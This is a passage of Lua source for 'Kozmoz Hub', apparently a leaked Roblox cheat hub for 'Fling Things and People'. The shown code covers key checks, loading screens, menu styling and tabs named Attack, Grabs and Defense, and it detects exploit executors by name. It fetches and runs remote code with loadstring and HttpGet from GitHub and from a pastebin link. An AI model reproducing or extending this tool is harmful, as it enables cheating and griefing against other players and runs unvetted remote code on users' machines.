    local dragStart, cardStart
    header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            cardStart = card.Position
        end
    end)
    local kozKeyConns = {}
    table.insert(kozKeyConns, UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            card.Position = UDim2.new(cardStart.X.Scale, cardStart.X.Offset + delta.X,
                cardStart.Y.Scale, cardStart.Y.Offset + delta.Y)
        end
    end))
    table.insert(kozKeyConns, UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end))

    -- MOUSE: Key ekrani acikken fare imleci HER ZAMAN gorunur ve serbest.
    -- Yukleme ekrani MouseBehavior = LockCenter yaptigi (ve oyun da her
    -- karede kilitleyebildigi) icin tek seferlik ayar yetmiyor; ekran
    -- kapanana kadar her karede Default + MouseIconEnabled zorlanir.
    -- Ekran kapaninca bu baglanti kesilir (alttaki kozKeyConns temizligi).
    pcall(function()
        UIS.MouseBehavior = Enum.MouseBehavior.Default
        UIS.MouseIconEnabled = true
    end)
    table.insert(kozKeyConns, Services.RunService.RenderStepped:Connect(function()
        if UIS.MouseBehavior ~= Enum.MouseBehavior.Default then
            UIS.MouseBehavior = Enum.MouseBehavior.Default
        end
        if not UIS.MouseIconEnabled then
            UIS.MouseIconEnabled = true
        end
    end))

    -- Acilis animasyonu
    TweenServiceK:Create(card, TweenInfo.new(0.45, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        { Position = UDim2.fromScale(0.5, 0.5), BackgroundTransparency = 0 }):Play()
    TweenServiceK:Create(cardStroke, TweenInfo.new(0.45), { Transparency = 0.05 }):Play()
    pcall(function() keyBox:CaptureFocus() end)

    local finished = false
    local busy = false
    local homePos = UDim2.fromScale(0.5, 0.5)

    local function setStatus(text, color)
        status.Text = text
        status.TextColor3 = color
    end

    local function shake()
        task.spawn(function()
            for _, off in ipairs({ -12, 10, -7, 4, 0 }) do
                if not card.Parent then return end
                TweenServiceK:Create(card, TweenInfo.new(0.05),
                    { Position = UDim2.new(0.5, off, 0.5, 0) }):Play()
                task.wait(0.055)
            end
            if card.Parent then card.Position = homePos end
        end)
    end

    local function attemptUnlock()
        if busy or finished then return end
        local entered = keyBox.Text:gsub("^%s+", ""):gsub("%s+$", "")
        if entered == "" then
            setStatus("Please enter a key first! Click \"GET KEY\" to get one from Panda.",
                Color3.fromRGB(255, 170, 60))
            shake()
            return
        end
        busy = true
        unlockBtn.Text = "CHECKING..."
        setStatus("Checking with Panda, please wait...",
            Color3.fromRGB(255, 190, 90))
        task.spawn(function()
            local okKey, reason = KozmozKey_Validate(entered)
            if okKey then
                KozmozKey_Save(entered)
                setStatus("Key accepted! Loading hub...",
                    Color3.fromRGB(80, 255, 150))
                unlockBtn.Text = "UNLOCKED ✓"
                task.wait(0.7)
                finished = true
            else
                busy = false
                unlockBtn.Text = "UNLOCK"
                if reason == "network" then
                    setStatus("Could not reach the Panda server. Check your connection and try again.",
                        Color3.fromRGB(255, 170, 60))
                elseif reason == "service" then
                    setStatus("Panda service not found! The owner must check the Service ID.",
                        Color3.fromRGB(255, 170, 60))
                else
                    setStatus("Invalid key! Paste the exact key you got from Panda.",
                        Color3.fromRGB(255, 85, 85))
                end
                shake()
            end
        end)
    end

    closeBtn.MouseButton1Click:Connect(function()
        kozCancelled = true
        KozmozKeyCancelled = true
        finished = true
    end)

    unlockBtn.MouseButton1Click:Connect(attemptUnlock)
    keyBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then attemptUnlock() end
    end)

    getKeyBtn.MouseButton1Click:Connect(function()
        setStatus("Preparing your Get Key link...", Color3.fromRGB(255, 190, 90))
        task.spawn(function()
            local link = KozmozKey_GetLink()
            print("[KOZMOZ KEY] Your Get Key link: " .. tostring(link))
            if KozmozKey_Copy(link) then
                setStatus("Link copied! Paste it into your browser to get your key.",
                    Color3.fromRGB(80, 255, 190))
            else
                setStatus("Clipboard not supported. Your link is in the console (F9).",
                    Color3.fromRGB(255, 170, 60))
            end
        end)
    end)

    repeat task.wait(0.1) until finished

    for _, conn in ipairs(kozKeyConns) do pcall(function() conn:Disconnect() end) end
    if gui then gui:Destroy() end
    if kozCancelled then
        -- Closed with X: free the mouse, hub does NOT load, script stops.
        KozmozKeyVerified = false
        pcall(function()
            UIS.MouseBehavior = Enum.MouseBehavior.Default
            UIS.MouseIconEnabled = true
        end)
        print("[KOZMOZ KEY] Key screen closed. Hub was not loaded.")
        return false
    end
    pcall(function()
        UIS.MouseBehavior = Enum.MouseBehavior.LockCenter
    end)
    KozmozKeyVerified = true
    return true
end

----------------------------------------------------------------
-- KAYITLI KEY KONTROLU (20 SAAT)
-- Gecerli kayit varsa: yukleme + key ekrani ATLANIR.
----------------------------------------------------------------
do
    local saved = KozmozKey_LoadSaved()
    if saved then
        local remainOk = true
        if KozmozKeyRevalidateOnStart then
            local okKey, reason = KozmozKey_Validate(saved.key)
            if okKey then
                remainOk = true
            elseif reason == "invalid" then
                -- Panda kesin olarak reddetti: key iptal/suresi dolmus/HWID degismis
                remainOk = false
                KozmozKey_ClearSaved()
                print("[KOZMOZ KEY] Saved key was rejected by Panda, showing the key screen.")
            else
                -- network/service gibi gecici sorun: 20 saatlik kayda guven,
                -- oyuncuya hicbir ekran gosterme
                remainOk = true
                warn("[KOZMOZ KEY] Panda is unreachable, continuing with the 20-hour saved key.")
            end
        end
        if remainOk then
            KozmozKeyVerified = true
            KozmozLoadingFinished = true
            if KozmozLoadingCleanup then pcall(KozmozLoadingCleanup) end
            KozmozLoadingCleanup = function()
                for _, guiName in ipairs({ "KozmozLoadingScreen", "KozmozKeyScreen" }) do
                    local g = Services.CoreGui:FindFirstChild(guiName)
                    if g then g:Destroy() end
                end
            end
            local remainHours = math.floor((saved.expiresAt - KozmozKey_Now()) / 3600)
            local remainMins = math.floor(((saved.expiresAt - KozmozKey_Now()) % 3600) / 60)
            print(string.format(
                "[KOZMOZ KEY] Saved key found (%dh %dm left). Loading and key screens skipped.",
                remainHours, remainMins))
        end
    end
end

-- Kayitli key YOKSA once mevcut yukleme ekrani calisir (asagidaki blok),
-- yukleme bitince key ekrani acilir. Kayitli key VARSA bu blok atlanir.
if not KozmozKeyVerified then

KozmozLoadingFinished = false
if KozmozLoadingCleanup then pcall(KozmozLoadingCleanup) end

oldGui = Services.CoreGui:FindFirstChild("KozmozLoadingScreen")
if oldGui then oldGui:Destroy() end

Connections = {}
function track(conn)
    table.insert(Connections, conn)
    return conn
end

KozmozLoadingCleanup = function()
    for _, c in ipairs(Connections) do pcall(function() c:Disconnect() end) end
    Connections = {}
    gui = Services.CoreGui:FindFirstChild("KozmozLoadingScreen")
    if gui then gui:Destroy() end
    Services.UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
end

ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "KozmozLoadingScreen"
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 10000
ScreenGui.Parent = Services.CoreGui

MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.fromScale(1, 1)
MainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.BorderSizePixel = 0
MainFrame.Parent = ScreenGui

Title = Instance.new("TextLabel")
Title.Text = "KOZMOZ HUB"
Title.Font = Enum.Font.SciFi
Title.TextSize = 100
Title.TextColor3 = Color3.fromRGB(255, 160, 0)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(0, 1000, 0, 100)
Title.Position = UDim2.fromScale(0.5, 0.48)
Title.AnchorPoint = Vector2.new(0.5, 0.5)
Title.TextTransparency = 1
Title.Parent = MainFrame

SubTitle = Instance.new("TextLabel")
SubTitle.Text = ""
SubTitle.Font = Enum.Font.Code
SubTitle.TextSize = 19
SubTitle.TextColor3 = Color3.fromRGB(255, 190, 90)
SubTitle.BackgroundTransparency = 1
SubTitle.Size = UDim2.new(0, 400, 0, 30)
SubTitle.Position = UDim2.fromScale(0.5, 0.56)
SubTitle.AnchorPoint = Vector2.new(0.5, 0.5)
SubTitle.Parent = MainFrame

SubStroke = Instance.new("UIStroke")
SubStroke.Color = Color3.fromRGB(255, 160, 0)
SubStroke.Thickness = 1
SubStroke.Transparency = 1
SubStroke.Parent = SubTitle

BarBack = Instance.new("Frame")
BarBack.Size = UDim2.new(0, 300, 0, 3)
BarBack.Position = UDim2.fromScale(0.5, 0.9)
BarBack.AnchorPoint = Vector2.new(0.5, 0.5)
BarBack.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
BarBack.BackgroundTransparency = 1
BarBack.BorderSizePixel = 0
BarBack.Parent = MainFrame

BarFill = Instance.new("Frame")
BarFill.Size = UDim2.fromScale(0, 1)
BarFill.BackgroundColor3 = Color3.fromRGB(255, 160, 0)
BarFill.BorderSizePixel = 0
BarFill.Parent = BarBack

BarGlow = Instance.new("UIStroke")
BarGlow.Color = Color3.fromRGB(255, 160, 0)
BarGlow.Thickness = 2
BarGlow.Transparency = 0.5
BarGlow.Parent = BarFill

Logo = Instance.new("ImageLabel")
Logo.Image = "rbxassetid://83405026470410"
Logo.BackgroundTransparency = 1
Logo.Size = UDim2.fromOffset(170, 170)
Logo.Position = UDim2.fromScale(0.5, 0.67)
Logo.AnchorPoint = Vector2.new(0.5, 0.5)
Logo.ScaleType = Enum.ScaleType.Fit
Logo.ImageTransparency = 1
Logo.Parent = MainFrame
-- [KOZMOZ] Logo her kosulda ortada ve gorunur olsun: doku yuklenir yuklenmez
-- transparency sifirlanir (eskiden sadece tween'e bagliydi, bazen logo
-- "ortaya gelmiyordu"), ayrica kucuk ekranlarda tasmasın diye boyut kisiti var.
local kozLogoFit = Instance.new("UISizeConstraint")
kozLogoFit.MinSize = Vector2.new(120, 120)
kozLogoFit.MaxSize = Vector2.new(220, 220)
kozLogoFit.Parent = Logo
Logo.Position = UDim2.new(0.5, 0, 0.67, 0)
task.spawn(function()
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({ Logo })
    end)
    task.wait()
    if Logo and Logo.Parent then
        Logo.ImageTransparency = 0
    end
end)
task.delay(2.5, function()
    if Logo and Logo.Parent then
        Logo.ImageTransparency = 0
    end
end)

task.spawn(function()
    local kozIntro, kozIntroErr = pcall(function()
    Services.TweenService:Create(MainFrame, TweenInfo.new(0.8), {BackgroundTransparency = 0.15}):Play()
    Services.TweenService:Create(Title, TweenInfo.new(1), {TextTransparency = 0.1}):Play()
    Services.TweenService:Create(Logo, TweenInfo.new(1.2), {ImageTransparency = 0}):Play()
    Services.TweenService:Create(BarBack, TweenInfo.new(1), {BackgroundTransparency = 0.5}):Play()

    task.wait(0.5)

    welcomeMsg = "" -- alt yazi kaldirildi (sadece KOZMOZ HUB gorunur)
    for i = 1, #welcomeMsg do
        SubTitle.Text = string.sub(welcomeMsg, 1, i)
        task.wait(0.03)
    end

    fillTween = Services.TweenService:Create(BarFill, TweenInfo.new(2.5, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.fromScale(1, 1)})
    fillTween:Play()

    start = tick()
    pulseConn = Services.RunService.RenderStepped:Connect(function()
        elapsed = tick() - start
        SubTitle.TextTransparency = 0.1 + ((math.sin(elapsed * 3) + 1) / 2 * 0.4)
        Title.TextTransparency = 0.05 + (math.sin(elapsed * 4) * 0.05)
        if KozmozLoadingFinished then pulseConn:Disconnect() end
    end)
    table.insert(Connections, pulseConn)

    fillTween.Completed:Wait()
    task.wait(0.4)

    exitTween = Services.TweenService:Create(MainFrame, TweenInfo.new(0.6), {BackgroundTransparency = 1})
    Services.TweenService:Create(Title, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
    Services.TweenService:Create(SubTitle, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
    Services.TweenService:Create(BarBack, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
    Services.TweenService:Create(BarFill, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
    Services.TweenService:Create(Logo, TweenInfo.new(0.5), {ImageTransparency = 1}):Play()
    exitTween:Play()
        exitTween.Completed:Wait()
    end)
    if not kozIntro then
        warn("KOZMOZ: yukleme ekrani yarisida kaldi: " .. tostring(kozIntroErr))
    end
    KozmozLoadingFinished = true
    pcall(KozmozLoadingCleanup)
end)

loadTimeout = tick() + 10
repeat task.wait() until KozmozLoadingFinished == true or tick() > loadTimeout
if not KozmozLoadingFinished then
    KozmozLoadingFinished = true
    pcall(KozmozLoadingCleanup)
end

end -- [/KOZMOZ KEY] yukleme ekrani blogu sonu (kayitli key varsa atlandi)

-- Yukleme bitti. Kayitli/gecerli key yoksa key ekranini ac ve dogrulanana
-- kadar hub'in geri kalaninin yuklenmesini BEKLET:
if not KozmozKeyVerified then
    KozmozKey_ShowAndWait()
    if not KozmozKeyVerified then
        -- Oyuncu X ile key ekranini kapatti (veya dogrulama tamamlanmadi):
        -- hub YUKLENMEZ, script burada tamamen durur.
        warn("[KOZMOZ KEY] Key screen closed without a valid key. Script stopped.")
        return
    end
end

print("KOZMOZ: System Ready.")

repo = "https://raw.githubusercontent.com/deividcomsono/Obsidian/main/"
library = {
    repo = repo,
    Library = loadstring(game:HttpGet(repo .. "Library.lua"))(),
    ThemeManager = loadstring(game:HttpGet(repo .. "addons/ThemeManager.lua"))(),
    SaveManager = loadstring(game:HttpGet(repo .. "addons/SaveManager.lua"))()
}

Options = Library.Options
Toggles = Library.Toggles
Library = library.Library
ThemeManager = library.ThemeManager
SaveManager = library.SaveManager
Library.Scheme.AccentColor = Color3.fromRGB(255, 160, 0)
Library.Scheme.BackgroundColor = Color3.fromRGB(12, 12, 12)
Library.Scheme.SidebarColor = Color3.fromRGB(255, 255, 255)
Library.Scheme.ButtonColor = Color3.fromRGB(255, 160, 0)
Library.Scheme.ButtonCornerRadius = UDim.new(0, 2)
Library.Scheme.ButtonCornerColor = Color3.fromRGB(255, 160, 0)
Library.Scheme.ButtonHoverColor = Color3.fromRGB(255, 178, 64)
Library.Scheme.TextColor = Color3.fromRGB(193, 205, 205)
Library.Scheme.SecondaryTextColor = Color3.fromRGB(193, 205, 205)

Window = Library:CreateWindow({
    Title = "KOZMOZ",
    Footer = "by Kozmoz Group",
    Icon = 83405026470410,
    Center = true,
    EnableCompacting = true,
    SidebarCompacted = true,
    AutoShow = true,
    CornerRadius = 15,
})

Players = game:GetService("Players")
player = Players.LocalPlayer
playerGui = player:WaitForChild("PlayerGui")

function waitFor(parent, name, recursive, timeout)
    timeout = timeout or 10
    start = tick()
    result = nil
    while not result and tick() - start < timeout do
        if recursive then
            result = parent:FindFirstChild(name, true)
        else
            result = parent:FindFirstChild(name)
        end
        if not result then
            task.wait(0.1)
        end
    end
    return result
end

menuGui = waitFor(playerGui, "MenuGui", true, 10)
if not menuGui then
    warn("MenuGui not found in PlayerGui!")
    return
end

topRight = waitFor(menuGui, "TopRight", true, 10)
if not topRight then
    warn("TopRight not found!")
    return
end

coinsFrame = waitFor(topRight, "CoinsFrame", false, 10)
if not coinsFrame then
    warn("CoinsFrame not found!")
    return
end

coinsDisplay = waitFor(coinsFrame, "CoinsDisplay", false, 10)
if not coinsDisplay then
    warn("CoinsDisplay not found!")
    return
end

coinImage = coinsDisplay:FindFirstChild("CoinImage")
coinsText = coinsDisplay:FindFirstChild("Coins")

if coinImage then
    coinImage.Image = "rbxassetid://86774413657183"
end

if coinsText then
    coinsText.TextColor3 = Color3.new(1, 1, 1)
end

coinsFrame.BackgroundTransparency = 0.35
coinsFrame.Position = coinsFrame.Position + UDim2.new(0, 0, 0, 15)

uiStroke = Instance.new("UIStroke")
uiStroke.Color = Color3.new(1, 1, 1)
uiStroke.Thickness = 2
uiStroke.LineJoinMode = Enum.LineJoinMode.Round
uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
uiStroke.Parent = coinsFrame

runtimeFrame = Instance.new("Frame")
runtimeFrame.Name = "MonitorFrame"
runtimeFrame.Size = UDim2.new(0, 380, 0, 25)
runtimeFrame.Position = UDim2.new(1, -380, 0, 90)
runtimeFrame.BackgroundTransparency = 0.35
runtimeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
runtimeFrame.BorderSizePixel = 0
runtimeFrame.Parent = coinsFrame

runtimeStroke = Instance.new("UIStroke")
runtimeStroke.Color = Color3.new(1, 1, 1)
runtimeStroke.Thickness = 2
runtimeStroke.LineJoinMode = Enum.LineJoinMode.Round
runtimeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
runtimeStroke.Parent = runtimeFrame

runtimeCorner = Instance.new("UICorner")
runtimeCorner.CornerRadius = UDim.new(0, 6)
runtimeCorner.Parent = runtimeFrame

runtimeLabel = Instance.new("TextLabel")
runtimeLabel.Name = "MonitorLabel"
runtimeLabel.Size = UDim2.new(1, 0, 1, 0)
runtimeLabel.BackgroundTransparency = 1
runtimeLabel.TextStrokeTransparency = 0.8
runtimeLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
runtimeLabel.Font = Enum.Font.GothamBold
runtimeLabel.TextSize = 10
runtimeLabel.RichText = true
runtimeLabel.Text = '<font color="rgb(255, 160, 0)">' .. (player and player.Name or "Unknown") .. '</font>'
runtimeLabel.Parent = runtimeFrame

CoinMonitor = {
    lastTime = os.clock(),
    frameCount = 0,
    currentFPS = 0
}

Services.RunService.RenderStepped:Connect(function()
    CoinMonitor.frameCount = CoinMonitor.frameCount + 1
    currentTime = os.clock()
    if currentTime - CoinMonitor.lastTime >= 1 then
        CoinMonitor.currentFPS = CoinMonitor.frameCount
        CoinMonitor.frameCount = 0
        CoinMonitor.lastTime = currentTime
    end
end)

function getCoinMonitorPing()
    stats = game:GetService("Stats")
    network = stats:FindFirstChild("Network")
    if network then
        ping = network:FindFirstChild("ServerStatsItem")
        if ping then
            dataPing = ping:FindFirstChild("Data Ping")
            if dataPing then return math.floor(dataPing:GetValue()) end
        end
    end
    return 0
end

task.spawn(function()
    while true do
        realPing = getCoinMonitorPing()
        fpsText = CoinMonitor.currentFPS
        pingText = realPing > 0 and realPing .. "ms" or "N/A"
        userName = player and player.Name or "Unknown"

        fpsColor = "0,255,0"
        if fpsText >= 120 then fpsStatus = "Smooth"
        elseif fpsText >= 60 then fpsColor = "255,200,0"; fpsStatus = "Playable"
        elseif fpsText >= 30 then fpsColor = "255,150,0"; fpsStatus = "Laggy"
        else fpsColor = "255,50,50"; fpsStatus = "Unplayable" end

        pingColor = "0,255,0"
        if realPing == 0 then pingColor = "128,128,128"; pingStatus = "N/A"
        elseif realPing >= 150 then pingColor = "255,50,50"; pingStatus = "Bad"
        elseif realPing >= 100 then pingColor = "255,150,0"; pingStatus = "Okay"
        elseif realPing >= 50 then pingColor = "255,200,0"; pingStatus = "Good"
        else pingStatus = "Excellent" end

        runtimeLabel.Text = '<font color="rgb(' .. fpsColor .. ')">FPS: ' .. fpsText .. ' (' .. fpsStatus .. ')</font> | <font color="rgb(' .. pingColor .. ')">Ping: ' .. pingText .. ' (' .. pingStatus .. ')</font> | <font color="rgb(255, 160, 0)">User: ' .. userName .. '</font>'
        task.wait(0.5)
    end
end)

function StyleMenuUI()
    player = game:GetService("Players").LocalPlayer
    playerGui = player:WaitForChild("PlayerGui")
    menuGui = playerGui:WaitForChild("MenuGui")
    menu = menuGui:WaitForChild("Menu")
    
    black = Color3.fromRGB(0, 0, 0)
    blue = Color3.fromRGB(30, 100, 200)
    purple = Color3.fromRGB(120, 50, 200) 
    cornerRadius = UDim.new(0, 0)
    
    function roundCorners(obj)
        corner = obj:FindFirstChildOfClass("UICorner")
        if corner then
            corner.CornerRadius = cornerRadius
        else
            corner = Instance.new("UICorner")
            corner.CornerRadius = cornerRadius
            corner.Parent = obj
        end
    end
    
    function addPurpleBlueGradient(obj, rotation)
        gradient = obj:FindFirstChildOfClass("UIGradient")
        if not gradient then
            gradient = Instance.new("UIGradient")
        end

        gradient.Color = ColorSequence.new{
            ColorSequenceKeypoint.new(0, purple),
            ColorSequenceKeypoint.new(1, blue)
        }
        gradient.Rotation = rotation or 45  
        gradient.Parent = obj
    end

    tabBarSizeY = 0.9999

    tabBar = menu:WaitForChild("TabBar")
    tabBar.BackgroundColor3 = black
    tabBar.BackgroundTransparency = 0.28
    tabBar.Size = UDim2.new(tabBar.Size.X.Scale, tabBar.Size.X.Offset, tabBarSizeY, tabBar.Size.Y.Offset)
    roundCorners(tabBar)

    tabContents = menu:WaitForChild("TabContents")
    for _, frame in ipairs(tabContents:GetChildren()) do
        if frame:IsA("Frame") then
            frame.BackgroundColor3 = black
            frame.BackgroundTransparency = 0.7
            roundCorners(frame)

            title = frame:FindFirstChild("Title")
            if title then
                title.BackgroundColor3 = black
                title.BackgroundTransparency = 0.4
                roundCorners(title)
                
                currentSize = title.Size
                title.Size = UDim2.new(currentSize.X.Scale * 0.975, currentSize.X.Offset, currentSize.Y.Scale, currentSize.Y.Offset)
            end

            sortingTabs = frame:FindFirstChild("SortingTabs")
            if sortingTabs then
                sortingTabs.BackgroundColor3 = black
                sortingTabs.BackgroundTransparency = 0.55
                roundCorners(sortingTabs)
            end

            contents = frame:FindFirstChild("Contents")
            if contents then
                contents.BackgroundColor3 = Color3.fromRGB(255, 255, 255) 
                contents.BackgroundTransparency = 0.7
                roundCorners(contents)
                addPurpleBlueGradient(contents, 45)
            end

            favoritesFrame = frame:FindFirstChild("FavoritesFrame")
            if favoritesFrame then
                favoritesFrame.BackgroundColor3 = black
                favoritesFrame.BackgroundTransparency = 1
                roundCorners(favoritesFrame)
            end

            if contents then
                for _, item in ipairs(contents:GetChildren()) do
                    fav = item:FindFirstChild("Favorite")
                    if fav and (fav:IsA("ImageLabel") or fav:IsA("ImageButton")) then
                        fav.ImageTransparency = 1
                        fav.BackgroundTransparency = 1
                    end
                end
            end
        end
    end

    for _, desc in ipairs(menuGui:GetDescendants()) do
        if desc.Name == "MeterFrame" and desc:IsA("GuiObject") then
            desc.BackgroundColor3 = black
            desc.BackgroundTransparency = 0.4
            roundCorners(desc)
        end
    end
end

StyleMenuUI()

Tabs = {
    MainTab = Window:AddTab("Home", "house"),
    PlayerTab = Window:AddTab("Player", "user"),
    GrabsTab = Window:AddTab("Grabs", "hand"),
    DefenseTab = Window:AddTab("Defense", "shield"),
    AttackTab = Window:AddTab("Attack", "swords"),
    AurasTab = Window:AddTab("Auras", "sparkles"),
    ServerTab = Window:AddTab("Server", "server"),
    BlobmanTab = Window:AddTab("Blobman", "bot"),
    FigureTab = Window:AddTab("Figures", "shirt"),
    VisualTab = Window:AddTab("Visuals", "eye"),
    KeybindsTab = Window:AddTab("Keybinds", "keyboard"),
    UiTab = Window:AddTab("UI Settings", "settings"),
    CreditsTab = Window:AddTab("Credits", "heart")
}

KozmozT = {
    marqueeGroupbox = Tabs.MainTab:AddLeftGroupbox("Kozmoz", "star", true, Color3.fromRGB(255, 160, 0)),
    marqueeLabel = nil,
    fullText = "leaked by virck"
}

KozmozT.marqueeLabel = KozmozT.marqueeGroupbox:AddLabel("", true, Color3.fromRGB(255, 160, 0))
task.spawn(function()
    while true do
        for i = 1, #KozmozT.fullText do
            KozmozT.marqueeLabel:SetText('<font color="rgb(255, 160, 0)">' .. string.sub(KozmozT.fullText, 1, i) .. '</font>')
            task.wait(0.05)
        end
        task.wait(1)
        for i = #KozmozT.fullText, 1, -1 do
            KozmozT.marqueeLabel:SetText('<font color="rgb(255, 160, 0)">' .. string.sub(KozmozT.fullText, 1, i) .. '</font>')
            task.wait(0.03)
        end
        task.wait(0.3)
    end
end)

player = Services.Players.LocalPlayer
LeftGroupbox = Tabs.MainTab:AddLeftGroupbox("Discord.gg/KseezeEjc", "user")

userId = player.UserId

LeftGroupbox:AddImage("playerThumb", {
    -- PNG1/PNG2'deki iste: bos alan artik kozmoz logosunu gosteriyor
    -- (avatar thumbnail'i kaldirildi; gereksiz ag isteginin hata verip
    -- script'i dusurma riski de kalkti)
    Image = "rbxassetid://83405026470410",
    Height = 150,
})

StatsGroup = Tabs.MainTab:AddRightGroupbox("System Stats", "monitor")
pingLabel = StatsGroup:AddLabel("Ping: Loading...")
fpsLabel = StatsGroup:AddLabel("FPS: Loading...")

PingFPS = {
    lastTime = os.clock(),
    frameCount = 0,
    currentFPS = 0
}

function getRealPing()
    stats = game:GetService("Stats")
    network = stats:FindFirstChild("Network")
    if network then
        ping = network:FindFirstChild("ServerStatsItem")
        if ping then
            dataPing = ping:FindFirstChild("Data Ping")
            if dataPing then return math.floor(dataPing:GetValue()) end
        end
    end
    return 0
end

Services.RunService.RenderStepped:Connect(function()
    PingFPS.frameCount = PingFPS.frameCount + 1
    currentTime = os.clock()
    if currentTime - PingFPS.lastTime >= 1 then
        PingFPS.currentFPS = PingFPS.frameCount
        PingFPS.frameCount = 0
        PingFPS.lastTime = currentTime
    end
end)

task.spawn(function()
    while true do
        realPing = getRealPing()
        if realPing == 0 then
            pingLabel:SetText("Ping: N/A")
        elseif realPing < 50 then
            pingLabel:SetText('<font color="rgb(0,255,0)">Ping: ' .. realPing .. ' ms (Excellent)</font>')
        elseif realPing < 100 then
            pingLabel:SetText('<font color="rgb(255,200,0)">Ping: ' .. realPing .. ' ms (Good)</font>')
        elseif realPing < 150 then
            pingLabel:SetText('<font color="rgb(255,150,0)">Ping: ' .. realPing .. ' ms (Okay)</font>')
        else
            pingLabel:SetText('<font color="rgb(255,50,50)">Ping: ' .. realPing .. ' ms (Bad)</font>')
        end

        if PingFPS.currentFPS >= 120 then
            fpsLabel:SetText('<font color="rgb(0,255,0)">FPS: ' .. PingFPS.currentFPS .. ' (Smooth)</font>')
        elseif PingFPS.currentFPS >= 60 then
            fpsLabel:SetText('<font color="rgb(255,200,0)">FPS: ' .. PingFPS.currentFPS .. ' (Playable)</font>')
        elseif PingFPS.currentFPS >= 30 then
            fpsLabel:SetText('<font color="rgb(255,150,0)">FPS: ' .. PingFPS.currentFPS .. ' (Laggy)</font>')
        else
            fpsLabel:SetText('<font color="rgb(255,50,50)">FPS: ' .. PingFPS.currentFPS .. ' (Unplayable)</font>')
        end
        task.wait(0.5)
    end
end)

hour = tonumber(os.date("%H"))
greeting = ""
if hour >= 5 and hour < 12 then greeting = "Good Morning"
elseif hour >= 12 and hour < 17 then greeting = "Good Afternoon"
elseif hour >= 17 and hour < 21 then greeting = "Good Evening"
else greeting = "Good Night" end

runtimeLabel2 = LeftGroupbox:AddLabel("Runtime: 00:00:00")
startTime = os.time()

task.spawn(function()
    while true do
        elapsed = os.time() - startTime
        hours = math.floor(elapsed / 3600)
        minutes = math.floor((elapsed % 3600) / 60)
        seconds = elapsed % 60
        runtimeLabel2:SetText('<font color="rgb(255, 160, 0)">Runtime: ' .. string.format("%02d:%02d:%02d", hours, minutes, seconds) .. '</font>')
        task.wait(1)
    end
end)

executor = "Unknown"
if syn then executor = "Synapse X"
elseif KRNL_LOADED then executor = "KRNL"
elseif getexecutorname then executor = getexecutorname()
elseif identifyexecutor then executor = identifyexecutor()
elseif SENTINEL_V2 then executor = "Sentinel"
elseif fluxus then executor = "Fluxus"
elseif Delta then executor = "Delta" end

rankList = {
    Owner = {10170190382, 8665097626 },
    Admin = {},
    BetaTester = {},
    Supporter = {},
    PremiumUser = {}
}

rankConfig = {
    Owner = { emoji = "👑", name = "Kozmoz Brothers", color = Color3.fromRGB(255, 215, 0) },
    Admin = { emoji = "⚡", name = "Admin", color = Color3.fromRGB(255, 100, 100) },
    BetaTester = { emoji = "🧪", name = "Beta Tester", color = Color3.fromRGB(100, 255, 100) },
    Supporter = { emoji = "💖", name = "Supporter", color = Color3.fromRGB(255, 150, 255) },
    PremiumUser = { emoji = "⭐", name = "Premium User", color = Color3.fromRGB(255, 255, 100) }
}

rankData = {emoji = "👤", name = "Kozmoz User", color = Color3.fromRGB(200, 200, 200)}
if IsPremium and PremiumData then
    rankData = {emoji = "👑", name = PremiumData.rank or "Premium", color = PremiumData.color or Color3.fromRGB(255, 215, 0)}
elseif table.find(rankList.Owner, userId) then rankData = rankConfig.Owner
elseif table.find(rankList.Admin, userId) then rankData = rankConfig.Admin
elseif table.find(rankList.BetaTester, userId) then rankData = rankConfig.BetaTester
elseif table.find(rankList.Supporter, userId) then rankData = rankConfig.Supporter
elseif table.find(rankList.PremiumUser, userId) then rankData = rankConfig.PremiumUser end

LeftGroupbox:AddLabel(greeting .. ", @" .. player.Name .. "!")
LeftGroupbox:AddLabel(rankData.emoji .. " Rank: " .. rankData.name)
LeftGroupbox:AddDivider()
LeftGroupbox:AddLabel("Display Name: " .. player.DisplayName)
LeftGroupbox:AddLabel("User ID: " .. player.UserId)
LeftGroupbox:AddLabel("Executor: " .. executor)
LeftGroupbox:AddLabel("Current Game: Fling Things and People")

RightGroupbox = Tabs.MainTab:AddRightGroupbox("Actions", "cog", true, Color3.fromRGB(193, 205, 205))

RightGroupbox:AddButton({
    Text = "Unload Kozmoz Hub",
    Func = function()
        task.wait(1)
        Library:Unload()
    end
})

RightGroupbox:AddButton({
    Text = "Rejoin Server",
    Func = function()
        task.wait(1)
        Library:Unload()
        game:GetService("TeleportService"):Teleport(game.PlaceId, player)
        task.wait(4)
        loadstring(game:HttpGet("https://pastebin.com/raw/XuV5RZUv"))()
    end
})

RightGroupbox:AddButton({
    Text = "Server Hop",
    Func = function()
        success, result = pcall(function()
            response = request({
                Url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100&sortOrder=Asc",
                Method = "GET"
            })
            return game:GetService("HttpService"):JSONDecode(response.Body)
        end)
